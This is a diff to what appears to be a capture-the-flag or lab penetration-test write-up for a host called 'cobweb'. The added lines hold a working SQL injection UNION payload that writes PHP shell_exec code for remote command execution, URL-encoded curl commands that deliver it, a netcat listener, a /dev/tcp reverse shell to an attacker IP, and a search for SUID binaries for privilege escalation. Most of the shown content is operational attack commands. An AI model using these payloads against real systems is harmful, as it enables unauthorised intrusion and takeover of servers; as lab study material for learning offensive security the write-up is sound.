@@ -332,25 +332,54 @@ Fails.
 
 Okay, apparently it's vulnerable to UNION.
 
+https://www.url-encode-decode.com/
+
 ```sh
 # Yes, you need to curl. Vulnerable to union
 
-" AND 1=2 UNION SELECT 'echo shell_exec("id");'-- 
-
-curl "http://cobweb/%22%20AND%201=2%20UNION%20SELECT%20%27echo%20shell_exec(%22id%22);%27--%20" 
-
-"
-
+# base
 # " AND 1=2 UNION SELECT 'echo shell_exec("id");'-- 
 
+# urlencoded
+curl "http://cobweb/%22%20AND%201=2%20UNION%20SELECT%20%27echo%20shell_exec(%22id%22);%27--%20" 
+
+
+ip a | grep 192 # get attacker ip = 192.168.49.53
+
+# start rev shell listener
+nc -nvlp 135
+
+# base
+# sh -i >& /dev/tcp/192.168.49.53/135 0>&1
+# " AND 1=2 UNION SELECT 'echo shell_exec("sh -i >& /dev/tcp/192.168.49.53/135 0>&1");'-- 
+
+# urlencoded
+curl "http://cobweb/%22%20AND%201%3D2%20UNION%20SELECT+%27echo%20shell_exec%28%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.53%2F135%200%3E%261%22%29%3B%27--%20"
 ```
 
 ![](Pasted%20image%2020260425162801.png)
 
 Okay! We have RCE that works reliably. Now to get a reverse shell.
 
+![](Pasted%20image%2020260425212603.png)
 
+We get rev shell.
 
+![](Pasted%20image%2020260425212631.png)
 
+Let's stabilize the shell.
+
+```sh
+which python3
+which python
+#nope.
+```
+
+We can't. Okay. Let's move on.
+
+```sh
+find / -perm 4000 -type f 2>/dev/null
+# nothing.
+```
 
 ## Root access
